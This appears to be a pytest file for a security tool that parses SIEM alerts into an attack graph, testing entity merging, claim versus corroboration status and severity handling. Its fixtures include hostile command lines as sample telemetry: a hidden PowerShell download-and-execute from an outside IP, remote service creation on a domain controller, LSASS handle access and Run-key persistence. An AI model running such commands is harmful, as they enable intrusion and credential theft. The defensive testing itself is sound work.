"""The attack graph's data model: what it merges, and what it refuses to claim.

Every fixture below is a real field shape taken from the store, not an
idealised one. The corpus is 14,430 key/value text bodies and 61 JSON ones, so
both are exercised.
"""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

import pytest

from app.services.alert_graph_assembly_service import (
    AlertEvidence,
    assemble,
)
from app.services.alert_graph_extraction_service import (
    CLAIMED,
    CORROBORATED,
    INFERRED,
    OBSERVED,
    PARSED,
    account_shape_problem,
    extract,
    host_key,
    read_fields,
    status_for,
)

NOW = datetime(2026, 8, 16, 9, 2, 11, tzinfo=timezone.utc)


def _text_body(**eventdata: str) -> str:
    """A body in the shape 14,430 of 15,203 stored alerts actually use."""
    lines = [
        "Alert: EXP-FIN-034 - something fired",
        "Rule: 100210",
        "Rule level: 12",
        "Agent: EXP-FIN-034 | 1634",
        "Computer: EXP-FIN-034.corp.local",
        "Event ID: 1",
    ]
    lines += [f"data.win.eventdata.{k}: {v}" for k, v in eventdata.items()]
    return "\n".join(lines)


def _evidence(body: str, *, run_id="r1", rule="100210", at=NOW, level=12, confirmed=()):
    return AlertEvidence(
        run_id=run_id, rule_id=rule, detection="d", event_time=at, source_severity=level,
        extracted=extract(body, risk_score=level, confirmed_techniques=confirmed),
    )


# --- status: the one rule that must never erode ----------------------------

def test_only_a_sensor_field_corroborates():
    assert status_for(OBSERVED) == CORROBORATED
    assert status_for(PARSED) == CLAIMED
    assert status_for(INFERRED) == CLAIMED


@pytest.mark.parametrize("basis", [None, "", "unknown", "likely", "high_confidence"])
def test_an_unrecognised_basis_is_a_claim(basis):
    """Never the optimistic reading. A graph is far more persuasive than a
    table — of 30,834 ATT&CK mappings in this estate 40 are confirmed — so an
    unmarked inference is more dangerous here, not less."""
    assert status_for(basis) == CLAIMED


def test_a_technique_a_rule_asserts_is_a_claim():
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    body += "\nMitre.Sub_technique.ID: T1059.001, T1106"
    out = extract(body)
    techniques = [e for e in out.entities if e.kind == "technique"]
    assert {t.label for t in techniques} == {"T1059.001", "T1106"}
    assert all(t.status == CLAIMED for t in techniques)


def test_a_technique_the_investigation_confirmed_is_corroborated():
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    body += "\nMitre.Sub_technique.ID: T1059.001, T1106"
    out = extract(body, confirmed_techniques=["T1059.001"])
    status = {e.label: e.status for e in out.entities if e.kind == "technique"}
    assert status == {"T1059.001": CORROBORATED, "T1106": CLAIMED}


# --- the delimiter rules, each one a measured failure ----------------------

def test_the_multi_value_separator_does_not_become_part_of_the_host():
    """One alert can aggregate several events and the text form joins their
    values with " | ": `Agent: EXP-4LWK334 | 1634`. Read whole, that is a
    machine called "EXP-4LWK334 | 1634" — a different machine from every other
    mention of the same host, which is the entity split this model exists to
    prevent."""
    fields = read_fields("Agent: EXP-4LWK334 | 1634\nRule level: 15 | 3")
    assert fields["agent.name"] == "EXP-4LWK334"
    assert fields["rule.level"] == "15"


def test_the_short_name_and_the_fqdn_are_one_host():
    """The same alert carries both spellings, so keying on the FQDN the brief
    asked for would draw one machine twice."""
    assert host_key("EXP-FIN-034") == host_key("EXP-FIN-034.corp.local")
    assert host_key("exp-fin-034.CORP.LOCAL") == "exp-fin-034"


def test_a_host_named_only_inside_a_unc_path_still_resolves():
    """`EXP-DC-01` appears nowhere in this estate except inside
    `\\\\EXP-DC-01\\ADMIN$`, and it has no FQDN at all."""
    assert host_key(r"\\EXP-DC-01\ADMIN$") == "exp-dc-01"


def test_an_agent_id_never_becomes_a_host():
    assert host_key("1634") is None


def test_only_technique_ids_come_out_of_the_mitre_triple():
    """The text form packs three indexed lists into one value: ids, then
    names, then tactics. Splitting the whole value on commas yields
    "Dynamic-link Library Injection" as a technique id."""
    body = (
        "MITRE: {0=T1055.001, 1=T1106} | {0=Dynamic-link Library Injection, "
        "1=Native API} | {0=Defense Evasion, 1=Privilege Escalation}"
    )
    assert read_fields(body)["rule.mitre.id"] == ["T1055.001", "T1106"]


def test_a_service_binary_survives_the_space_after_the_equals_sign():
    """`binpath=(\\S+)` against the stored string returns nothing, because the
    real command line is `binpath= C:\\Windows\\odsvc.exe`. The naive pattern
    finds no binary and the chain stops dead at the service node."""
    body = _text_body(
        image=r"C:\Users\jdoe\AppData\Local\Temp\ps.exe",
        commandLine=r'ps.exe \\EXP-DC-01 -u CORP\jdoe -s cmd.exe /c "sc create updsvc binpath= C:\Windows\odsvc.exe"',
        targetServer=r"\\EXP-DC-01\ADMIN$",
    )
    out = extract(body)
    services = [e for e in out.entities if e.kind == "service"]
    files = [e for e in out.entities if e.kind == "file"]
    assert [s.label for s in services] == ["updsvc"]
    assert "odsvc.exe" in {f.label for f in files}
    # And it belongs to the machine the command reached, not the one that typed
    # it: keyed locally, a domain controller's new service is filed under a
    # workstation.
    assert services[0].attrs["host"] == "exp-dc-01"


def test_a_dotted_path_is_matched_whole_not_by_suffix():
    """alert_field_service._DOTTED matches `[\\w.]*\\.{key}`, and switched on
    for every field at once it gave 11,374 alerts an `event_name` of "Account
    Manipulation, Valid Accounts" — a technique list read as an event name
    because some dotted path ends in `.name`. Keying on the whole path cannot
    do that."""
    fields = read_fields("some.other.image: C:\\decoy.exe\ndata.win.eventdata.image: C:\\real.exe")
    assert fields["data.win.eventdata.image"] == "C:\\real.exe"
    assert fields["some.other.image"] == "C:\\decoy.exe"


# --- what the extractor refuses to say -------------------------------------

def test_the_process_on_the_far_end_of_a_handle_does_not_run_as_the_caller():
    """`lsass.exe ran_as CORP\\jdoe` is a false statement about a real event:
    the alert's principal is whoever opened the handle."""
    body = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
        grantedAccess="0x1410",
        user=r"CORP\jdoe",
    )
    out = extract(body)
    lsass = next(e for e in out.entities if e.label == "lsass.exe")
    ran_as = [e for e in out.edges if e.kind == "ran_as"]
    assert all(e.source != lsass.merge_key for e in ran_as)
    handle = next(e for e in out.edges if e.kind == "opened_handle")
    assert handle.attrs["granted_access"] == "0x1410"


def test_pe_version_metadata_is_not_a_security_control():
    """`ed.product` occurs on 294 runs as a signed binary's version block
    (company/description/product/fileVersion). Keyed on it, every signed
    executable in the estate becomes a "security control" — a node true of
    everything, which can neither link nor rank."""
    body = _text_body(
        image=r"C:\Windows\System32\cmd.exe", processId="4",
        product="Microsoft® Windows® Operating System",
        description="Windows Command Processor",
        company="Microsoft Corporation",
    )
    out = extract(body)
    assert not [e for e in out.entities if e.kind == "security_control"]


def test_a_real_security_control_needs_a_feature_and_a_state():
    body = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        product="Windows Defender Antivirus",
        feature="Real-Time Protection",
        state="Disabled",
    )
    out = extract(body)
    control = next(e for e in out.entities if e.kind == "security_control")
    assert control.status == CORROBORATED
    assert [e.kind for e in out.edges if e.kind == "disabled"] == ["disabled"]


def test_a_url_in_a_command_line_is_a_claim_but_its_address_is_a_node():
    body = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
        commandLine=(
            'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient)'
            ".DownloadString('http://185.220.101.47/a')\""
        ),
    )
    out = extract(body)
    urls = [e for e in out.entities if e.kind == "url"]
    ips = [e for e in out.entities if e.kind == "ip"]
    assert [u.attrs["url"] for u in urls] == ["http://185.220.101.47/a"]
    assert [i.label for i in ips] == ["185.220.101.47"]
    assert all(e.status == CLAIMED for e in urls + ips)


# --- the assembler: the merges that are the whole point --------------------

def test_the_same_binary_named_three_ways_is_one_node():
    """Across case #1440 `odsync.exe` is the source of an LSASS handle with
    PID 7788, the unnamed parent of two other processes, and the data of a Run
    key. Four observations, one binary. Drawn as four nodes, persistence sits
    on one leaf and credential access on another, and the graph hides the only
    thing worth seeing."""
    with_pid = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
    )
    as_parent = _text_body(
        image=r"C:\Windows\System32\nltest.exe",
        parentImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
    )
    as_registry_data = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="7340",
        targetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
        details=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
    )
    graph = assemble([
        _evidence(with_pid, run_id="a", rule="100515"),
        _evidence(as_parent, run_id="b", rule="61017", at=NOW + timedelta(minutes=5)),
        _evidence(as_registry_data, run_id="c", rule="100311", at=NOW + timedelta(seconds=36)),
    ])
    odsync = [n for n in graph["nodes"] if "odsync.exe" in n["label"]]
    assert len(odsync) == 1, [n["label"] for n in graph["nodes"]]
    # The PID-bearing observation survives, so the node is the corroborated one.
    assert odsync[0]["attrs"]["pid"] == "7788"
    assert odsync[0]["status"] == CORROBORATED
    assert odsync[0]["absorbed"], "the node must say which observations it merged"
    # And it must admit that the unification itself was not observed.
    assert odsync[0]["attrs"]["merged_without_pid"] is True


def test_two_alerts_on_one_pid_are_two_witnesses_not_two_nodes():
    first = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120", parentImage=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        parentProcessId="5044",
    )
    second = _text_body(
        path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120", scriptBlockText="$e='JAB...';IEX(...)",
    )
    graph = assemble([
        _evidence(first, run_id="a", rule="100210"),
        _evidence(second, run_id="b", rule="92052", at=NOW + timedelta(seconds=3)),
    ])
    pwsh = [
        n for n in graph["nodes"]
        if n["kind"] == "process" and n["attrs"].get("pid") == "6120"
    ]
    assert len(pwsh) == 1
    assert {w["rule_id"] for w in pwsh[0]["witnesses"]} == {"100210", "92052"}
    assert pwsh[0]["witness_count"] == 2


def test_an_address_reached_two_ways_is_flagged_as_reused_infrastructure():
    """A stager URL at 09:02 and a C2 name resolving to the same address at
    09:19. That convergence is the finding a table cannot show, and on a
    60-node canvas nobody counts inbound edges."""
    stager = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
        commandLine="powershell -c \"DownloadString('http://185.220.101.47/a')\"",
    )
    beacon = _text_body(
        image=r"C:\Windows\odsvc.exe",
        destinationIp="185.220.101.47",
        destinationHostname="updates-cdn-sync.com",
        destinationPort="443",
    )
    graph = assemble([
        _evidence(stager, run_id="a", rule="100210"),
        _evidence(beacon, run_id="b", rule="100805", at=NOW + timedelta(minutes=17)),
    ])
    ips = [n for n in graph["nodes"] if n["kind"] == "ip"]
    assert len(ips) == 1
    assert ips[0]["attrs"]["reused_infrastructure"] is True
    assert len(ips[0]["attrs"]["reached_by"]) >= 2


# --- the inference guard ---------------------------------------------------

def test_an_orphan_process_gets_an_inferred_parent_marked_as_a_claim():
    """`reg.exe` wrote the Run key and its alert names no parent, so the link
    from the command interpreter to persistence is simply absent."""
    pwsh = _text_body(
        image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        processId="6120",
    )
    reg = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="7340",
        targetObject=r"HKU\S-1-5-21-1\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
    )
    graph = assemble([
        _evidence(pwsh, run_id="a", rule="100210"),
        _evidence(reg, run_id="b", rule="100311", at=NOW + timedelta(seconds=36)),
    ])
    inferred = [e for e in graph["edges"] if e["attrs"].get("inferred")]
    assert len(inferred) == 1
    assert inferred[0]["kind"] == "spawned"
    assert inferred[0]["status"] == CLAIMED
    assert inferred[0]["attrs"]["gap_seconds"] == 36
    assert "not the sensor's" in inferred[0]["attrs"]["why"]


def test_the_inference_never_contradicts_the_telemetry():
    """The first version of this drew `spawned odsync.exe -> lsass.exe`.
    LSASS was not spawned by anything here — it was *opened* — so the
    inference did not merely guess, it asserted the opposite of what the
    sensor said, on the edge a board would read as the credential-theft step.
    A node already reached by any edge is left alone."""
    handle = _text_body(
        sourceImage=r"C:\Users\jdoe\AppData\Roaming\odsync.exe",
        sourceProcessId="7788",
        targetImage=r"C:\Windows\System32\lsass.exe",
        grantedAccess="0x1410",
    )
    graph = assemble([_evidence(handle, run_id="a", rule="100515")])
    spawned_into_lsass = [
        e for e in graph["edges"]
        if e["kind"] == "spawned" and "lsass" in e["target"]
    ]
    assert not spawned_into_lsass


def test_a_distant_process_is_left_unparented_rather_than_guessed():
    """`odsvc.exe` beacons 4m15s after `ps.exe` runs and is a service on
    another machine, so a link between them would be fiction."""
    ps = _text_body(image=r"C:\Users\jdoe\AppData\Local\Temp\ps.exe", processId="9001")
    beacon = _text_body(image=r"C:\Windows\odsvc.exe", destinationIp="185.220.101.47")
    graph = assemble([
        _evidence(ps, run_id="a", rule="100710"),
        _evidence(beacon, run_id="b", rule="100805", at=NOW + timedelta(seconds=255)),
    ])
    assert not [e for e in graph["edges"] if e["attrs"].get("inferred")]


def test_a_process_whose_parent_the_sensor_reported_is_not_second_guessed():
    first = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="100")
    second = _text_body(
        image=r"C:\Windows\System32\reg.exe", processId="200",
        parentImage=r"C:\Windows\explorer.exe", parentProcessId="300",
    )
    graph = assemble([
        _evidence(first, run_id="a"),
        _evidence(second, run_id="b", at=NOW + timedelta(seconds=10)),
    ])
    assert not [e for e in graph["edges"] if e["attrs"].get("inferred")]


# --- the JSON shape, which is 61 of 15,203 bodies --------------------------

def test_the_json_shape_reads_the_same_fields():
    body = (
        '{"rule":{"id":"100210","level":12,"mitre":{"id":["T1204.002"]}},'
        '"agent":{"name":"EXP-FIN-034"},'
        '"data":{"win":{"system":{"computer":"EXP-FIN-034.corp.local"},'
        '"eventdata":{"image":"C:\\\\Windows\\\\System32\\\\cmd.exe",'
        '"processId":"6120","user":"CORP\\\\jdoe"}}}}'
    )
    out = extract(body)
    kinds = {e.kind for e in out.entities}
    assert {"host", "account", "process", "technique"} <= kinds
    host = next(e for e in out.entities if e.kind == "host")
    assert host.label == "exp-fin-034"
    technique = next(e for e in out.entities if e.kind == "technique")
    assert technique.status == CLAIMED


def test_a_body_that_is_not_json_or_key_values_yields_nothing_rather_than_junk():
    """712 bodies are CEF or syslog. Nothing is better than a host called
    "<110>1"."""
    out = extract(
        "<110>1 2026-08-09T14:24:56.126Z 1cf1c42e1f05 Skyformation - "
        "5007553803360726235 - CEF:0|Skyformation|Cloud Apps Security|2.0.0"
    )
    assert not [e for e in out.entities if e.kind == "host"]


# --- auto-collapse ---------------------------------------------------------

def _account_body(user: str) -> str:
    """A Windows security event, which names a principal and no process.

    This is the shape that produced case #194's 192 account nodes: 4624/4768
    style records carry `subjectUserName` and nothing to hang it off except
    the host.
    """
    return _text_body(subjectUserName=user, subjectUserSid=f"S-1-5-21-{abs(hash(user)) % 9999}")


def test_identical_leaves_collapse_into_one_counted_node():
    """A domain controller's log context names 192 accounts, each attached to
    the host by one edge and to nothing else. Drawn individually they were 192
    of case #194's 261 nodes and carried no information — accurate and
    unreadable, which is the failure collapse exists to stop."""
    evidence = [
        _evidence(_account_body(f"CORP\\user{i}"), run_id=f"r{i}",
                  at=NOW + timedelta(seconds=i))
        for i in range(12)
    ]
    graph = assemble(evidence)
    accounts = [n for n in graph["nodes"] if n["kind"] == "account"]
    assert len(accounts) == 1
    assert accounts[0]["attrs"]["group"] is True
    assert accounts[0]["attrs"]["member_count"] == 12
    assert "12 accounts" == accounts[0]["label"]
    assert graph["collapsed"] == [
        {"id": accounts[0]["id"], "kind": "account", "edge": "ran_as", "members": 12}
    ]


def test_a_node_reached_more_than_once_is_never_collapsed_away():
    """Anything reached twice is part of the structure — the account that also
    ran a process, the address also named by a URL. Those convergences are the
    whole reason the graph exists."""
    shared = r"CORP\jdoe"
    bodies = [_account_body(f"CORP\\user{i}") for i in range(8)]
    # This one also ran a process, so it has a second edge and must survive
    # the fold that takes the other eight.
    ran_something = _text_body(
        image=r"C:\Windows\System32\cmd.exe", processId="901", user=shared,
    )
    evidence = [
        _evidence(b, run_id=f"r{i}", at=NOW + timedelta(seconds=i))
        for i, b in enumerate(bodies)
    ] + [_evidence(ran_something, run_id="rx", at=NOW + timedelta(seconds=30))]
    graph = assemble(evidence)
    accounts = {n["label"]: n for n in graph["nodes"] if n["kind"] == "account"}
    assert shared in accounts, list(accounts)
    assert not accounts[shared]["attrs"].get("group")
    # And the eight that only ever appeared as a name did fold.
    assert any(n["attrs"].get("group") for n in accounts.values())


def test_a_small_set_of_siblings_is_left_alone():
    evidence = [
        _evidence(_account_body(f"CORP\\user{i}"), run_id=f"r{i}",
                  at=NOW + timedelta(seconds=i))
        for i in range(3)
    ]
    graph = assemble(evidence)
    assert len([n for n in graph["nodes"] if n["kind"] == "account"]) == 3
    assert graph["collapsed"] == []


def test_a_collapsed_group_is_only_corroborated_if_every_member_was():
    observed = [
        _evidence(_account_body(f"CORP\\user{i}"), run_id=f"r{i}",
                  at=NOW + timedelta(seconds=i))
        for i in range(6)
    ]
    graph = assemble(observed)
    group = next(n for n in graph["nodes"] if n["kind"] == "account")
    assert group["status"] == CORROBORATED
    assert group["attrs"]["corroborated_members"] == 6


# --- the empty state -------------------------------------------------------

def test_an_unreadable_source_says_which_source_rather_than_drawing_nothing():
    """Case #1106 is Palo Alto syslog. A blank canvas reads as "no attack
    here", which is the exact bug the 404-on-a-stale-key had."""
    body = (
        "<12>Sep 14 08:21:27 172.16.23.1 1,2026/09/14 08:21:26,013101014199,"
        "THREAT,spyware,2818,2026/09/14 08:21:25,10.64.0.109"
    )
    graph = assemble([_evidence(body, run_id="a")])
    assert graph["nodes"] == []
    assert "has no field map" in graph["note"]
    assert "not a finding that the case is harmless" in graph["note"]
    assert graph["sources"]["unmapped"]


def test_a_graph_reports_every_source_it_drew_from_not_only_broken_ones():
    """A case of eight Windows alerts and four Fortigate ones draws two
    thirds of itself, and saying so is the difference between a partial graph
    and a wrong one."""
    windows = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    graph = assemble([_evidence(windows, run_id="a")])
    sources = {s["source"]: s for s in graph["sources"]["by_source"]}
    assert "windows_eventchannel" in sources or sources
    assert graph["sources"]["by_source"][0]["alerts"] == 1


# --- the seventh delimiter bug of this shape -------------------------------

def test_a_path_separator_is_not_a_unc_host():
    """`"C:\\\\Program Files\\\\Git\\\\bin\\\\bash.exe"` produced a host called
    `program`, and across the estate the host list gained `windows`, `system`,
    `users`, `python312`, `secpol`, `sysmon`, `microsoft` and `localhost` —
    fourteen path fragments drawn as machines. The criticality seeder then
    proposed one of them as a crown jewel, which is how a parsing slip becomes
    a badge on a board slide."""
    body = _text_body(
        image=r"C:\Windows\System32\cmd.exe", processId="4",
        commandLine=r'"C:\\Program Files\\Git\\bin\\bash.exe" -c "source /c/Users/x/.bashrc"',
    )
    out = extract(body)
    hosts = {e.label for e in out.entities if e.kind == "host"}
    assert hosts == {"exp-fin-034"}, hosts
    assert not [e for e in out.edges if e.kind == "remote_exec_via"]


def test_a_real_unc_target_is_still_found():
    for command, expected in [
        (r'ps.exe \\EXP-DC-01 -u CORP\jdoe -s cmd.exe', "exp-dc-01"),
        (r'net use \\FILESRV01\share /user:CORP\jdoe', "filesrv01"),
    ]:
        body = _text_body(
            image=r"C:\Windows\System32\cmd.exe", processId="4", commandLine=command,
        )
        out = extract(body)
        hosts = {e.label for e in out.entities if e.kind == "host"}
        assert expected in hosts, (command, hosts)
        assert [e.kind for e in out.edges if e.kind == "remote_exec_via"]


def test_a_windows_authority_name_is_not_a_machine():
    """`\\\\BUILTIN\\Administrators` sits in UNC position and is a well-known
    group, not a server. It was drawn as a host and then proposed as a
    high-criticality asset."""
    for name in (r"\\BUILTIN\Administrators", r"\\NT AUTHORITY\SYSTEM", "localhost"):
        assert host_key(name) is None, name
    # And a machine that merely starts with one of those words is unaffected.
    assert host_key(r"\\BUILTINSRV01\c$") == "builtinsrv01"


# --- shape guards: quarantine, never drop ----------------------------------

def test_event_id_15_never_yields_an_account_and_says_why():
    """Sysmon EID 15 carries the alternate data stream's bytes in `Contents`,
    and Wazuh's decoding of those bytes leaks into the adjacent `user` field.
    107 of 299,087 user fields in stored log context are 1-2 characters and
    100% of them are EID 15 — values `_` (78) and `P` (29).

    Quarantining per value would treat the symptom: the field is untrustworthy
    for this event type whatever it happens to contain, so the mapping is
    suppressed and the raw value is kept visible."""
    body = "\n".join([
        "Alert: EXP-5190TV3 - Sigma Sysmon Archive Exe",
        "Rule: 103100",
        "Rule level: 3",
        "Agent: EXP-5190TV3 | 1090",
        "Computer: EXP-5190TV3.int.expertware.net",
        "Event ID: 15",
        r"data.win.eventdata.image: C:\WINDOWS\Explorer.EXE",
        r"data.win.eventdata.targetFilename: C:\Users\ftibu\Downloads\getvpn32.cmp",
        "data.win.eventdata.user: P",
        "data.win.eventdata.contents: \u6e41\u6861\u6965",
    ])
    out = extract(body)
    assert not [e for e in out.entities if e.kind == "account"]
    quarantined = [e for e in out.entities if e.kind == "unparsed"]
    assert len(quarantined) == 1
    assert quarantined[0].attrs["raw"] == "P"
    assert quarantined[0].attrs["source_field"].endswith("user")
    assert "Event ID 15" in quarantined[0].attrs["why"]
    assert out.quarantined and out.quarantined[0]["value"] == "P"
    # And the fields the corruption did NOT touch are still read. Measured:
    # targetFilename and image are intact on all 107 events.
    processes = {e.label for e in out.entities if e.kind == "process"}
    assert "Explorer.EXE" in processes


def test_a_domain_qualified_account_is_not_mistaken_for_a_path():
    """`DOMAIN\\user` is the normal form. The first version of this guard
    rejected any backslash and would have quarantined almost every real
    account in the estate."""
    for name in (r"CORP\jdoe", "jdoe", r"NT AUTHORITY\SYSTEM", r"INT\lvizeteu"):
        assert account_shape_problem(name) is None, name


@pytest.mark.parametrize("value", ["P", "_", r"C:\Users\x", r"\\SRV01\share", "a/b", r"A\B\C"])
def test_an_identifier_shaped_like_a_path_or_a_fragment_is_quarantined(value):
    assert account_shape_problem(value) is not None


def test_a_quarantined_identifier_is_kept_rather_than_dropped():
    """Dropping hides the parser bug that produced it, which is how this class
    keeps recurring: six delimiter bugs before `_UNC`, and that one surfaced
    only because a seeding helper printed a host called `program`."""
    body = _text_body(
        image=r"C:\Windows\System32\cmd.exe", processId="4",
        user=r"C:\Users\someone",
    )
    out = extract(body)
    assert not [e for e in out.entities if e.kind == "account"]
    kept = [e for e in out.entities if e.kind == "unparsed"]
    assert len(kept) == 1
    assert kept[0].status == CLAIMED, "an unparsed value is never corroborated"
    assert out.quarantined, "the count must rise so a new source shows up"


# --- the severity field, renamed to say what it is -------------------------

def test_the_indicator_score_and_the_source_severity_are_separate_numbers():
    """A 0-100 indicator-reputation sum was travelling in a field named
    `rule_level` and being read against thresholds of 13/10/7 written for
    Wazuh's 1-16 scale."""
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    out = extract(body, risk_score=90)
    process = next(e for e in out.entities if e.kind == "process")
    assert process.attrs["indicator_risk_score"] == 90
    # Rule level 12 of 16 normalises to 75, and is a different number.
    assert process.attrs["source_severity"] == round(12 / 16 * 100)
    assert process.attrs["source_severity_raw"] == "rule.level=12/16"


def test_an_unscored_alert_contributes_no_indicator_score_rather_than_zero():
    """7,260 of 15,255 runs read 0 where the smallest real score is 5, so 0
    means unscored. Encoding it as a measurement ranked nearly half the estate
    as least severe."""
    body = _text_body(image=r"C:\Windows\System32\cmd.exe", processId="4")
    out = extract(body, risk_score=0)
    process = next(e for e in out.entities if e.kind == "process")
    assert "indicator_risk_score" not in process.attrs


# --- severity, read from the source that states it -------------------------

def test_fortigate_severity_comes_from_fortios_not_from_wazuhs_flattened_level():
    """Wazuh assigns `rule.level = 1` to 2,527 of Fortigate's 2,533 alerts, so
    reading that ranked every firewall alert as uniformly trivial — including
    in the 300-alert bound. FortiOS states its own severity in `data.level`,
    where `notice` and `alert` do differ."""
    from app.services.source_severity_service import normalise

    notice, raw_notice = normalise({"data.level": "notice", "rule.level": "1"})
    alarm, raw_alarm = normalise({"data.level": "alert", "rule.level": "1"})
    assert notice < alarm, (notice, alarm)
    assert "data.level" in raw_notice and "data.level" in raw_alarm


def test_the_louder_of_two_firewall_signals_wins():
    """`crlevel` grades the attack signature and `data.level` grades the log
    record; neither subsumes the other. Preferring the more specific one alone
    let `crlevel=low` override `data.level=alert` and under-rank an event the
    firewall itself shouted about."""
    from app.services.source_severity_service import normalise

    score, raw = normalise({"data.crlevel": "low", "data.level": "alert"})
    assert score == normalise({"data.level": "alert"})[0]
    assert "also crlevel=low" in raw


def test_a_severity_is_never_zero_even_at_the_bottom_of_a_scale():
    """0 would be indistinguishable from an absent severity, which is the
    error this module exists to undo."""
    from app.services.source_severity_service import normalise

    for fields in ({"data.level": "debug"}, {"rule.level": "1"}):
        score, _raw = normalise(fields)
        assert score is not None and score >= 1


def test_a_source_stating_no_severity_gets_an_absence_with_a_reason():
    from app.services.absence import UNRATED
    from app.services.source_severity_service import normalise, severity_absence

    assert normalise({}) == (None, None)
    missing = severity_absence("unstructured syslog")
    assert missing.kind == UNRATED
    assert "unstructured syslog" in missing.reason
    assert "rather than a low one" in missing.reason
